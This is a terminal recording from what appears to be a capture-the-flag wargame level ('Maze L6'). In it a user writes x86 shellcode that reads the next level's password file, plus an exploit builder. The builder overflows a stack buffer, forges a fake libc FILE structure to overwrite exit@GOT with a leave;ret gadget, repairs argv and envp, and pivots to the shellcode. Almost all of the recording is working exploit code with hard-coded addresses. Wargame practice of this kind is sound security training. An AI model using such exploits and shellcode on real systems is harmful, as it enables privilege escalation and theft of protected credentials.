[24.366768, "o", "cat > /run/screen/l6/sc.py <<'PYEOF'\r\r\n\u001b[?2004l\r\u001b[?2004h> #!/usr/bin/env python3\r\r\n\u001b[?2004l\r\u001b[?2004h> \"\"\"Maze L6 shellcode: open/read/write /etc/maze_pass/maze7 (NUL-free, no '*').\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> Path built on the stack via pushes (NUL via a pre-push of eax); read into a\r\r\n\u001b[?2004l\r\u001b[?2004h> buffer allocated below the strings (sub esp); written to fd 1; exit.\r\r\n\u001b[?2004l\r\u001b[?2004h> Avoids NUL and '*' (0x2a) in every byte (argv[2] must be NUL-free, and a raw\r\r\n\u001b[?2004l\r\u001b[?2004h> 0x2a would become NUL in argv[2] via the frob encoding).\r\r\n\u001b[?2004l\r\u001b[?2004h> \"\"\"\r\r\n\u001b[?2004l\r\u001b[?2004h> import sys\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> sc = bytes([\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x31, 0xC0,                       # xor eax, eax\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x50,                             # push eax            (NUL terminator for path)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x68, 0x61, 0x7A, 0x65, 0x37,     # push \"aze7\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x68, 0x73, 0x73, 0x2F, 0x6D,     # push \"ss/m\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x68, 0x65, 0x5F, 0x70, 0x61,     # push \"e_pa\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x68, 0x2F, 0x6D, 0x61, 0x7A,     # push \"/maz\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x68, 0x2F, 0x65, 0x74, 0x63,     # push \"/etc\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x89, 0xE3,                       # mov ebx, esp        (path)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x31, 0xC9,                       # xor ecx, ecx        (O_RDONLY)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xB0, 0x05,                       # mov al, 5           (open)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xCD, 0x80,                       # int 0x80\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x89, 0xC3,                       # mov ebx, eax        (fd)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x83, 0xEC, 0x20,                 # sub esp, 0x20       (buffer)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x89, 0xE1,                       # mov ecx, esp        (buf)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x31, 0xD2,                       # xor edx, edx\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xB2, 0x0F,                       # mov dl, 15          (count)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xB0, 0x03,                       # mov al, 3           (read)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xCD, 0x80,                       # int 0x80\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x31, 0xDB,                       # xor ebx, ebx\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xB3, 0x01,                       # mov bl, 1           (fd 1)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x89, 0xE1,                       # mov ecx, esp        (buf)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x89, 0xC2,                       # mov edx, eax        (nread)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xB0, 0x04,                       # mov al, 4           (write)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xCD, 0x80,                       # int 0x80\r\r\n\u001b[?2004l\r\u001b[?2004h>     0x31, 0xDB,                       # xor ebx, ebx\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xB0, 0x01,                       # mov al, 1           (exit)\r\r\n\u001b[?2004l\r\u001b[?2004h>     0xCD, 0x80,                       # int 0x80\r\r\n\u001b[?2004l\r\u001b[?2004h> ])\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> if __name__ == \"__main__\":\r\r\n\u001b[?2004l\r\u001b[?2004h>     bad = set(b\"\\x00\\x2a\")\r\r\n\u001b[?2004l\r\u001b[?2004h>     assert not (bad & set(sc)), [hex(b) for b in sc if b in bad]\r\r\n\u001b[?2004l\r\u001b[?2004h>     assert 0 not in bytes(b ^ 42 for b in sc), \"frobbed sc has NUL\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     sys.stdout.buffer.write(sc)\r\r\n\u001b[?2004l\r\u001b[?2004h> PYEOF\r\r\n\u001b[?2004l\r\u001b]3008;start=8a215129-13ef-400b-8f1e-0a9d693ddb4c;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/maze6\u001b\\\u001b]3008;end=8a215129-13ef-400b-8f1e-0a9d693ddb4c;exit=success\u001b\\\u001b]3008;start=3a687c62-dfce-4130-80b1-eac70b32b1b8;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/maze6\u001b\\\u001b[?2004h\u001b]0;maze6@maze: ~\u0007maze6@maze:~$ "]
[57.666841, "o", "echo '# Writing the exploit builder (heredoc, code visible):'\r\r\n\u001b[?2004l\r\u001b]3008;start=3b32b93d-69a3-494f-b47e-f0548a74729f;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/maze6\u001b\\# Writing the exploit builder (heredoc, code visible):\r\r\n\u001b]3008;end=3b32b93d-69a3-494f-b47e-f0548a74729f;exit=success\u001b\\\u001b]3008;start=3a687c62-dfce-4130-80b1-eac70b32b1b8;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/maze6\u001b\\\u001b[?2004h\u001b]0;maze6@maze: ~\u0007maze6@maze:~$ cat > /run/screen/l6/exploit.py <<'PYEOF'\r\r\n\u001b[?2004l\r\u001b[?2004h> #!/usr/bin/env python3\r\r\n\u001b[?2004l\r\u001b[?2004h> \"\"\"Maze L6 exploit builder v5.\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> Stack layout (measured with the raw ~519-byte payload, gdb --args):\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf         = ebp - 0x104          (strcpy target, 0x100 bytes)\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf+0x100   = FILE* f              (overwrite -> fake FILE at buf+0x220)\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf+0x104   = saved ebx (0x0804b11c)\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf+0x108   = saved eip            (dead: main ends with exit(0))\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf+0x10c   = argc (3)             -- caller frame, OVERFLOW-REACHABLE\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf+0x110   = argv pointer         -- repair -> buf+0x1d0\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf+0x114   = envp pointer         -- repair -> buf+0x1dc (argv NULL slot)\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf+0x1d0   = argv[0..2] + NULL    -- INSIDE the overflow, repair pointers\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf+0x220   = fake FILE (copy of the real heap FILE, redirected write pointers)\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf+0x2c0   = shellcode (open/read/write /etc/maze_pass/maze7 -> fd 1)\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> buf[0..4] = leave;ret (libc+0x1af32e): the fprintf line \"path : buf\" starts at\r\r\n\u001b[?2004l\r\u001b[?2004h> exit@GOT-24, so buf[0..4] lands exactly on exit@GOT. After fprintf, `call\r\r\n\u001b[?2004l\r\u001b[?2004h> exit@plt -> jmp *GOT` runs leave;ret: esp := ebp, pop ebp, ret -> eip =\r\r\n\u001b[?2004l\r\u001b[?2004h> [buf+0x108] = shellcode.\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> Raw payload may contain NULs (they ride in argv[2] as 0x2a bytes and memfrob\r\r\n\u001b[?2004l\r\u001b[?2004h> restores them after the full-length strlen); argv[2] itself must be NUL-free,\r\r\n\u001b[?2004l\r\u001b[?2004h> so the raw payload must not contain 0x2a.\r\r\n\u001b[?2004l\r\u001b[?2004h> \"\"\"\r\r\n\u001b[?2004l\r\u001b[?2004h> import struct, sys\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> LIBC = 0xF7D6D000\r\r\n\u001b[?2004l\r\u001b[?2004h> GADGET_LEAVE_RET = LIBC + 0x1AF32E          # leave; ret\r\r\n\u001b[?2004l\r\u001b[?2004h> SAVED_EBX        = 0x0804B11C\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> EXIT_GOT = 0x0804B228\r\r\n\u001b[?2004l\r\u001b[?2004h> FAKE_OFF = 0x1E0                            # fake FILE inside buf (right after argv[])\r\r\n\u001b[?2004l\r\u001b[?2004h> PATH_OFF = 0x284                            # path string copy inside buf (NUL-terminated)\r\r\n\u001b[?2004l\r\u001b[?2004h> SC_OFF   = 0x2A0                            # shellcode inside buf (after the path copy)\r\r\n\u001b[?2004l\r\u001b[?2004h> ARGV_OFF = 0x1D0                            # argv[0..2] + NULL\r\r\n\u001b[?2004l\r\u001b[?2004h> STR_A0   = 0x318                            # \"/run/screen/l6/m6\" (rel. buf)\r\r\n\u001b[?2004l\r\u001b[?2004h> STR_A1   = 0x32A                            # path            (rel. buf)\r\r\n\u001b[?2004l\r\u001b[?2004h> STR_A2   = 0x340                            # payload text    (rel. buf)\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> REAL_FILE = bytes.fromhex(\r\r\n\u001b[?2004l\r\u001b[?2004h>     \"84 3c ad fb 50 c1 04 08 50 c1 04 08 50 c1 04 08 \"\r\r\n\u001b[?2004l\r\u001b[?2004h>     \"50 c1 04 08 6d c1 04 08 50 d1 04 08 50 c1 04 08 \"\r\r\n\u001b[?2004l\r\u001b[?2004h>     \"50 d1 04 08 00 00 00 00 00 00 00 00 00 00 00 00 \"\r\r\n\u001b[?2004l\r\u001b[?2004h>     \"00 00 00 00 40 3c fa f7 03 00 00 00 00 00 00 00 \"\r\r\n\u001b[?2004l\r\u001b[?2004h>     \"00 00 00 00 00 00 00 00 a8 c0 04 08 ff ff ff ff \"\r\r\n\u001b[?2004l\r\u001b[?2004h>     \"ff ff ff ff 00 00 00 00 b4 c0 04 08 00 00 00 00 \"\r\r\n\u001b[?2004l\r\u001b[?2004h>     \"00 00 00 00 20 3c fa f7 ff ff ff ff 00 00 00 00 \"\r\r\n\u001b[?2004l\r\u001b[?2004h>     \"00 0"]
[57.666989, "o", "0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \"\r\r\n\u001b[?2004l\r\u001b[?2004h>     \"00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \"\r\r\n\u001b[?2004l\r\u001b[?2004h>     \"00 00 00 00 a8 27 fa f7 00 00 00 00 00 00 00 00\"\r\r\n\u001b[?2004l\r\u001b[?2004h> )\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> def build(buf_addr: int, path: bytes, shellcode: bytes) -> bytes:\r\r\n\u001b[?2004l\r\u001b[?2004h>     line_prefix = len(path) + 3\r\r\n\u001b[?2004l\r\u001b[?2004h>     fake = buf_addr + FAKE_OFF\r\r\n\u001b[?2004l\r\u001b[?2004h>     wbase = EXIT_GOT - line_prefix\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h>     fp = bytearray(REAL_FILE)\r\r\n\u001b[?2004l\r\u001b[?2004h>     fp[0x10:0x14] = struct.pack(\"<I\", wbase)           # _IO_write_base\r\r\n\u001b[?2004l\r\u001b[?2004h>     fp[0x14:0x18] = struct.pack(\"<I\", wbase)           # _IO_write_ptr\r\r\n\u001b[?2004l\r\u001b[?2004h>     fp[0x18:0x1c] = struct.pack(\"<I\", wbase + 0x800)   # _IO_write_end\r\r\n\u001b[?2004l\r\u001b[?2004h>     fp[0x1c:0x20] = struct.pack(\"<I\", wbase)           # _IO_buf_base\r\r\n\u001b[?2004l\r\u001b[?2004h>     fp[0x20:0x24] = struct.pack(\"<I\", wbase + 0x800)   # _IO_buf_end\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h>     p = bytearray(b\"A\" * 0x100)\r\r\n\u001b[?2004l\r\u001b[?2004h>     p[0:4] = struct.pack(\"<I\", GADGET_LEAVE_RET)        # buf[0..4] -> exit@GOT\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += struct.pack(\"<I\", fake)                        # f @ buf+0x100\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += struct.pack(\"<I\", SAVED_EBX)                   # saved ebx\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += struct.pack(\"<I\", buf_addr + SC_OFF)           # saved eip (pivot target)\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += struct.pack(\"<I\", 3)                           # argc\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += struct.pack(\"<I\", buf_addr + ARGV_OFF)         # argv pointer\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += struct.pack(\"<I\", buf_addr + ARGV_OFF + 0xc)   # envp pointer\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += b\"B\" * (ARGV_OFF - len(p))\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += struct.pack(\"<I\", buf_addr + STR_A0)           # argv[0]\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += struct.pack(\"<I\", buf_addr + PATH_OFF)         # argv[1] -> path INSIDE payload\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += struct.pack(\"<I\", buf_addr + STR_A2)           # argv[2]\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += struct.pack(\"<I\", 0)                           # argv NULL\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += fp\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += b\"C\" * (PATH_OFF - len(p))\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += path + b\"\\x00\"                                 # the path string, payload-internal\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += b\"C\" * (SC_OFF - len(p))\r\r\n\u001b[?2004l\r\u001b[?2004h>     p += shellcode\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h>     assert 0x2a not in p, \"raw payload has 0x2a -> NUL in argv[2]\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     argv2 = bytes(b ^ 42 for b in p)\r\r\n\u001b[?2004l\r\u001b[?2004h>     assert 0 not in argv2, \"argv[2] has NUL\"\r\r\n\u001b[?2004l\r\u001b[?2004h>     return argv2\r\r\n\u001b[?2004l\r\u001b[?2004h> \r\r\n\u001b[?2004l\r\u001b[?2004h> if __name__ == \"__main__\":\r\r\n\u001b[?2004l\r\u001b[?2004h>     buf = int(sys.argv[1], 16)\r\r\n\u001b[?2004l\r\u001b[?2004h>     path = sys.argv[2].encode()\r\r\n\u001b[?2004l\r\u001b[?2004h>     sc = bytes.fromhex(sys.argv[3])\r\r\n\u001b[?2004l\r\u001b[?2004h>     sys.stdout.buffer.write(build(buf, path, sc))\r\r\n\u001b[?2004l\r\u001b[?2004h> PYEOF\r\r\n\u001b[?2004l\r\u001b]3008;start=e9c62dd8-a1d8-45a3-8a04-c062a112074e;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/maze6\u001b\\\u001b]3008;end=e9c62dd8-a1d8-45a3-8a04-c062a112074e;exit=success\u001b\\\u001b]3008;start=3a687c62-dfce-4130-80b1-eac70b32b1b8;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=maze6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/maze6\u001b\\\u001b[?2004h\u001b]0;maze6@maze: ~\u0007maze6@maze:~$ "]
